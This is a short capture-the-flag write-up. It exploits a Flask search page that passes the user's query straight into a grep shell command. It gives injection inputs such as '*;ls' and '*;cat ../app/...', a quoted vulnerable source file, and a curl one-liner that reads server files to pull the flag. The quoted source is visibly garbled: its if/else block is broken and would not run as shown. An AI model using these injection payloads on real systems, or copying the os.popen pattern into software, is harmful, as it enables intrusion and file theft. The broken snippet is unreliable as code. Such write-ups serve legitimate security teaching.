### Challange 

We have received information that Harald has a system where he stores information about the Bluetooth protocol. He configured the service himself because he does not trust anyone else. We believe there may be vulnerabilities in how he set up the service.

Can you check if there are any secrets in Harald's home directory on the server?

## Solve 

Target is a webserver running flask. 
It has a search field that can be used to search a database (that is actually a text file). After testing a bit it is obvious that backend uses "grep" directly in some way. 

Input "*;ls" will run the ls in the current folder for example. 

If you want you can have a look at the source-code of search.py by using input: 

```
*;cat ../app/flaskjakt/routes/search.py
```
Gives: 

```
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results_with_snippets = []
    error_messages = []
    if query:
        file_path = 'harald_notes.txt'
        cmd = f"/usr/bin/grep -i -n -- {query} {file_path} 2>&1"
        try:
            print(f"Executing command: {cmd}")
            output = os.popen(cmd).read()
            print(f"Command output: {output}")
            if output:
                for line in output.split('\n'):
                    if line:
                            error_messages.append(html.escape(line))
                        else:
                            escaped_line = html.escape(line)
                            highlighted_line = escaped_line.replace(query, f'<span style="color:red;">{query}</span>')
                            results_with_snippets.append(highlighted_line)
            else:
                error_messages.append("No matches found.")
        except Exception as e:
            error_messages.append(f"An error occurred while running the search: {e}")
    return render_template('search_results.html', query=query, error_messages=error_messages, results=results_with_snippets)
```

One-liner to get the flag: 

```
curl "https://undutmaning-544a112b103a-flaskjakt-0.chals.io/search?q=*%3Bcat+..%2Fapp%2F*%2F*" |  awk 'match($0, /undut{[^}]*}/) { print substr($0, RSTART, RLENGTH) }' 
```
